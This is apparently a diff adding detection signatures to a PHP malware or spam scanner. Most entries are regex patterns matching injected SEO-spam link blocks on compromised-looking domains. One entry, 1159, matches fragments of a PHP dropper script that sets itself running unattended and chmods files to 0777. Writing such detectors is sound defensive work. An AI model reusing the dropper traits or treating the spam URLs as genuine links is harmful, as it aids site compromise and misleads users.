+    1123 => 
+    array (
+      'pattern' => '/ual Repair Guide &amp; Schematics\\.  Manual, or by contacting Invivo directly\\.  Information Portal\\. 80，buy WT \\- IP5 Aut/s',
+      'label' => 'sample-specific content window',
+    ),
+    1124 => 
+    array (
+      'pattern' => '/p keyboard player who needs to equip themselves with a strong core of pianos, e\\-pianos, pads and synths\\.  How to make Ab/s',
+      'label' => 'sample-specific content window',
+    ),
+    1125 => 
+    array (
+      'pattern' => '/ref\\=http\\:\\/\\/www\\.ardexendura\\.com\\/7yki\\/can\\-you\\-make\\-gummies\\-with\\-butter\\.html\\>jw\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1126 => 
+    array (
+      'pattern' => '/ednagar, ahmednagar e Paper\\.  Mt\\.  Watch Live TV News, Breaking News, News debates and much more at ABPLive\\. m\\. bhaskar\\./s',
+      'label' => 'sample-specific content window',
+    ),
+    1127 => 
+    array (
+      'pattern' => '/tp\\:\\/\\/quierodulce\\.000webhostapp\\.com\\/shfnob\\/ffxiv\\-healer\\-stat\\-priority\\.html\\>v3\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1128 => 
+    array (
+      'pattern' => '/p\\/wholesale\\-planters\\-near\\-me\\.html\\>ls\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1129 => 
+    array (
+      'pattern' => '/4\\/stm32\\-read\\-and\\-write\\-flash\\.html\\>2a\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1130 => 
+    array (
+      'pattern' => '/arjah\\.html\\>2l\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1131 => 
+    array (
+      'pattern' => '/\\.ru\\/pic\\/turbo\\-vacuum\\-routing\\.html\\>fw\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1132 => 
+    array (
+      'pattern' => '/zr\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1133 => 
+    array (
+      'pattern' => '/r6\\-pro\\-league\\-map\\-pool\\-2019\\.html\\>x7\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1134 => 
+    array (
+      'pattern' => '/1n\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1135 => 
+    array (
+      'pattern' => '/n death by\\: his parents, Virgil and Laverne Marshall; and his wife, Marilyn The Independent \\- a place for remembering lo/s',
+      'label' => 'sample-specific content window',
+    ),
+    1136 => 
+    array (
+      'pattern' => '/laristrading\\.com\\/on545n\\/weather\\-radar\\-for\\-michigan\\.html\\>l5\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1137 => 
+    array (
+      'pattern' => '/\\-to\\-speed\\-up\\-warp\\-stabilizer\\.html\\>ma\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1138 => 
+    array (
+      'pattern' => '/o\\-explain\\-respect\\-to\\-a\\-child\\.html\\>uc\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1139 => 
+    array (
+      'pattern' => '/m\\/mlqc97pk4\\/matlab\\-play\\-tone\\.html\\>f4\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1140 => 
+    array (
+      'pattern' => '/forum\\.html\\>hu\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1141 => 
+    array (
+      'pattern' => '/d\\-message\\-in\\-line\\-group\\-chat\\.html\\>kh\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1142 => 
+    array (
+      'pattern' => '/for a way to &quot;burn in&quot; or render\\/rembed\\/hardcode subtitles \\(from an SRT file\\) into an MP4 video with VLC\\.  Aft/s',
+      'label' => 'sample-specific content window',
+    ),
+    1143 => 
+    array (
+      'pattern' => '/p\\:\\/\\/cbdorganicreviews\\.com\\/iu8st\\/hp\\-probook\\-6570b\\-bios\\-password\\-reset\\.html\\>gn\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1144 => 
+    array (
+      'pattern' => '/ef\\=http\\:\\/\\/sayehbeauty\\.com\\/jzv1u2\\/indie\\-unity\\-games\\.html\\>pi\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1145 => 
+    array (
+      'pattern' => '/uae2\\/coles\\-eastern\\-creek\\.html\\>za\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1146 => 
+    array (
+      'pattern' => '/ives was updated Jan 2019\\. \\) &lt;h2 class\\=&quot;entry\\-title&quot; style\\=&quot;text\\-align\\: justify;&quot;&gt;&lt;span sty/s',
+      'label' => 'sample-specific content window',
+    ),
+    1147 => 
+    array (
+      'pattern' => '/ldbfll\\/what\\-are\\-the\\-three\\-basic\\-economic\\-questions\\.html\\>fa\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1148 => 
+    array (
+      'pattern' => '/k\\.co\\.jp\\/oiwv\\/gps\\-corrections\\.html\\>ka\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1149 => 
+    array (
+      'pattern' => '/ation\\.html\\>q6\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1150 => 
+    array (
+      'pattern' => '/ept it from clipboard and send in ADM Editor, or[\\s\\S]{0,12000}\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1151 => 
+    array (
+      'pattern' => '/\\<\\!DOCTYPE html\\>
+
+\\<html class\\="no\\-js" lang\\="en\\-US[\\s\\S]{0,12000}rizona gun range in which a nine\\-year\\-old girl s/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1152 => 
+    array (
+      'pattern' => '/w school shall use due diligence in obtaining and verifying such information\\.  20008 Phone\\: 202\\-806\\-8000 The American Ba/s',
+      'label' => 'sample-specific content window',
+    ),
+    1153 => 
+    array (
+      'pattern' => '/href\\=http\\:\\/\\/premiertelecare\\.com\\/fui8\\/ue4\\-use\\-controller\\-rotation\\-yaw\\.html\\>xt\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1154 => 
+    array (
+      'pattern' => '/s\\/csgo\\-packet\\-loss\\-fix\\-2019\\.html\\>jt\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1155 => 
+    array (
+      'pattern' => '/10060\\.html\\>rx\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1156 => 
+    array (
+      'pattern' => '/\\>, \\<a href\\=http\\:\\/\\/220v\\-katalog\\.ru\\/hnpuzc\\/facebook\\+\\-bot\\+\\-script\\+\\-2019\\.html\\>4h\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1157 => 
+    array (
+      'pattern' => '/\\-rest\\-reflexology\\-penang\\.html\\>bc\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1158 => 
+    array (
+      'pattern' => '/\\<\\/a\\>, \\<a href\\=http\\:\\/\\/fb\\.costaservicios\\.com\\/cno0g\\/learning\\-labs\\-cisco\\.html\\>21\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1159 => 
+    array (
+      'pattern' => '/\\<\\?php
+ignore_user_abort\\(\\);
+set_time_limit\\(0\\);
+
+i[\\s\\S]{0,12000}2\\.\\$f3;
+
+if \\(file_exists\\(\\$ff\\)\\) chmod \\(\\$ff, 0777\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1160 => 
+    array (
+      'pattern' => '/d upon between the manufacturer and the purchaser\\. , updated daily\\! Casting definition is \\- something \\(such as the excre/s',
+      'label' => 'sample-specific content window',
+    ),
+    1161 => 
+    array (
+      'pattern' => '/eddit\\.html\\>jv\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1162 => 
+    array (
+      'pattern' => '/mrh\\/slack\\-internship\\-reddit\\.html\\>zg\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1163 => 
+    array (
+      'pattern' => '/8cm\\/waze\\-api\\-travel\\-time\\.html\\>cn\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1164 => 
+    array (
+      'pattern' => '/ai\\/1jp\\/z650\\-crash\\-protection\\.html\\>te\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1165 => 
+    array (
+      'pattern' => '/ore about &\\#39;STM32WB55 Demo&\\#39; on element14\\.  The STM32WB5x series supports &nbsp; Feb 13, 2019 Read about &\\#39;STM3/s',
+      'label' => 'sample-specific content window',
+    ),
+    1166 => 
+    array (
+      'pattern' => '/olutions\\.com\\/s0a\\/cygwin\\-installation\\-on\\-windows\\-10\\.html\\>bf\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1167 => 
+    array (
+      'pattern' => '/box70\\.com\\/ayfvk\\/e\\-mozzy\\-shot\\.html\\>hg\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1168 => 
+    array (
+      'pattern' => '/anvillage\\.m2agency\\.co\\.uk\\/tz77cmt\\/ice\\-class\\-expedition\\-yacht\\-for\\-sale\\.html\\>6m\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1169 => 
+    array (
+      'pattern' => '/zrlj\\/winscp\\-script\\-open\\-scp\\.html\\>5l\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1170 => 
+    array (
+      'pattern' => '/boxes\\.html\\>lp\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1171 => 
+    array (
+      'pattern' => '/bt\\/adani\\-coal\\-mine\\-benefits\\.html\\>85\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1172 => 
+    array (
+      'pattern' => '/ge\\/gtx\\-1060\\-fan\\-not\\-spinning\\.html\\>hg\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1173 => 
+    array (
+      'pattern' => '/61\\/do\\-psychopaths\\-know\\-they\\-are\\-psychopaths\\-reddit\\.html\\>l5\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1174 => 
+    array (
+      'pattern' => '/lbqh\\/quantum\\-optics\\-book\\.html\\>2u\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1175 => 
+    array (
+      'pattern' => '/a href\\=http\\:\\/\\/www\\.rprhydro\\.com\\/fpoxqv\\/cryptlex\\-api\\.html\\>yg\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1176 => 
+    array (
+      'pattern' => '/, invitation card\\. 625&quot; 3\\. 0 × 33\\.  \\$9\\. 7 × 16\\. 5\\:9 ratio \\(~411 ppi density\\) Protection\\: Corning Gorilla Glass \\(u/s',
+      'label' => 'sample-specific content window',
+    ),
+    1177 => 
+    array (
+      'pattern' => '/\\<a href\\=http\\:\\/\\/aqarkandena\\.com\\/cfrypfe\\/mks\\-contact\\.html\\>oa\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1178 => 
+    array (
+      'pattern' => '/FW_3\\.  Download the Jailbreak PS3 3\\. 84 CFW download free\\. Once you jailbroke your PlayStation 3 you can instantly backu/s',
+      'label' => 'sample-specific content window',
+    ),
+    1179 => 
+    array (
+      'pattern' => '/domotion\\.com\\/gzb27w\\/neb\\-vasp\\.html\\>ta\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1180 => 
+    array (
+      'pattern' => '/m\\.ua\\/v72ccq\\/david\\-lama\\-wife\\.html\\>yu\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1181 => 
+    array (
+      'pattern' => '/r strips\\! Leader Alcohol Swabs Sterile 70 Percent Isopropyl Alcohol 100 count, 6 Packs\\.  \\*\\*Please note that not all prod/s',
+      'label' => 'sample-specific content window',
+    ),
+    1182 => 
+    array (
+      'pattern' => '/ika\\-pakistani\\-reporter\\-wiki\\.html\\>sb\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1183 => 
+    array (
+      'pattern' => '/\\-a\\-balloon\\-free\\-download\\.html\\>rb\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1184 => 
+    array (
+      'pattern' => '/nfaxl\\/fintech\\-categorization\\.html\\>8y\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1185 => 
+    array (
+      'pattern' => '/8a\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1186 => 
+    array (
+      'pattern' => '/vo\\-on\\-call\\-free\\-for\\-4\\-years\\.html\\>bn\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1187 => 
+    array (
+      'pattern' => '/a href\\=http\\:\\/\\/paskha\\.biz\\.ua\\/rxb9cac\\/ue4\\-line\\-trace\\-single\\-by\\-channel\\.html\\>56\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1188 => 
+    array (
+      'pattern' => '/nia\\.com\\.br\\/qbci\\/vrc\\-pro\\-mods\\.html\\>nd\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1189 => 
+    array (
+      'pattern' => '/pain is due to a vpn booter minor scratch, a vpn booter deep abrasion or a vpn booter corneal foreign body, it&\\#39;s a v/s',
+      'label' => 'sample-specific content window',
+    ),
+    1190 => 
+    array (
+      'pattern' => '/cape is a trademark of Jagex Software © 1999\\-20[\\s\\S]{0,12000}\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1191 => 
+    array (
+      'pattern' => '/0r\\/dead\\-body\\-found\\-on\\-beach\\.html\\>zr\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1192 => 
+    array (
+      'pattern' => '/href\\=http\\:\\/\\/lazis\\.unnes\\.ac\\.id\\/cyz0thv5\\/ansys\\-prep7\\.html\\>h5\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1193 => 
+    array (
+      'pattern' => '/k30\\/open\\-source\\-classifieds\\.html\\>df\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1194 => 
+    array (
+      'pattern' => '/ther hand, can be toggled on or off, bt pressing &quot;P&quot;\\.  Pixologic has announced that ZBrush 4R8, the long\\-await/s',
+      'label' => 'sample-specific content window',
+    ),
+    1195 => 
+    array (
+      'pattern' => '/3vh\\/miele\\-dryer\\-error\\-codes\\.html\\>ve\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1196 => 
+    array (
+      'pattern' => '/nities\\.com\\/wekm\\/new\\-espn\\-app\\.html\\>ia\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1197 => 
+    array (
+      'pattern' => '/\\/trc\\/g4zlp\\-cat\\-interface\\.html\\>xc\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
